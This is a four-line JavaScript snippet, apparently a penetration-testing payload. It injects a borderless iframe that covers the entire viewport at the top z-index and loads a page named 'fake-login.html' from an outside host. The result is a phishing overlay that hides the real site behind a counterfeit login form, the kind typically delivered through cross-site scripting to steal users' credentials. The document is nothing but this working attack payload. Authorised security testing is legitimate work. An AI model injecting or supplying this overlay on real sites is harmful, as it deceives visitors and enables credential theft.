const iframe = document.createElement("iframe");
iframe.src = "https://pentest-www.xmco.fr/JDE/fake-login.html";
iframe.style.cssText = "position:fixed; top:0; left:0; width:100vw; height:100vh; border:none; z-index:9999; background:white;";
document.body.appendChild(iframe);